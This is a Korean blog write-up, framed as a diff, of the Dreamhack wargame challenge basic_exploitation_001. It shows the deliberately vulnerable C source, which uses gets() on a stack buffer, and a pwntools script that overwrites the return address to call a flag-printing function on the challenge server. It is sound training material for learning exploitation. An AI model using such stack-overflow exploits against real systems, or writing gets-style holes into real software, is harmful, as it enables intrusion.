@@ -1,0 +1,90 @@
+---
+title: "[Dreamhack] basic_exploitation_001 문제 풀이"
+date: "2024-07-14"
+tags: ["dreamhack", "system_hacking", "wargame"]
+draft: false
+summary: "요약: 오늘도 좀 쉬웠다 ㅋ"
+---
+
+# 문제 파악
+
+이번것도 쉬웠다 ~~YUMMYYYYYYYYY!~~
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+void alarm_handler() {
+puts("TIME OUT");
+exit(-1);
+}
+
+void initialize() {
+setvbuf(stdin, NULL, _IONBF, 0);
+setvbuf(stdout, NULL, _IONBF, 0);
+
+signal(SIGALRM, alarm_handler);
+alarm(30);
+}
+
+void read_flag() {
+system("cat /flag");
+}
+
+int main(int argc, char *argv[]) {
+
+char buf[0x80];
+
+initialize();
+gets(buf);
+
+return 0;
+}
+```
+
+지난 코드하고 달라진 점은 두군데정도가 있다.
+
+> scanf에서 gets로 변경(별차이 없음)
+> read_flag라는 대놓고 플래그 주는 함수가 있음
+
+이걸 return address로 덮어버릴거임.
+
+# 익스 코드 작성
+
+전이랑 방식은 같다. 간단하게 설명하자면 
+
+- esp~ebp까지의 간격~~이라고 해야하나..?~~ 어느정도인지 파악하기. -> 132byte 만큼 쓸거임
+- 더미값 넣고,
+- read_flag 주소 넣으면? 끝
+
+```python
+from pwn import *
+
+p = remote('host1.dreamhack.games', 17039)
+# p = process('./basic_exploitation_001')
+
+payload = b'A' * 132
+payload += p32(0x080485b9)
+
+pause()
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+아 짧아서 좋다
+
+# 익스플로잇!!
+
+거창하게 느낌표 좀 붙여봤고 결과는 아래 사진과 같다.
+
+![](https://i.imgur.com/dik2JeY.png)
+
+개 야미~~~ 행복하구만 ㅇㅇ
+
+---
+
+__오늘은 여기까지, 다음은 Stack Canary로 돌아오겠습니다.__
